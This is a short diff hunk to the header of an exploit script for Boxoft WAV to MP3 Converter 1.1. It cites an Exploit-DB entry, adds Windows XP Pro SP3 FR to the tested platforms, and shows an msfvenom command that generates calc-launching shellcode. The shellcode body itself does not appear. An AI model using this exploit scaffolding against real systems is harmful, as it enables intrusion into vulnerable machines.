@@ -2,7 +2,7 @@
 
 # Boxoft WAV to MP3 Converter 1.1
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/44971
-# Exploit tested on Windows 7 Pro SP1 EN
+# Exploit tested on Windows 7 Pro SP1 EN and Windows XP Pro SP3 FR
 
 # msfvenom -p windows/exec CMD=calc -f python -v shellcode
 shellcode =  b""
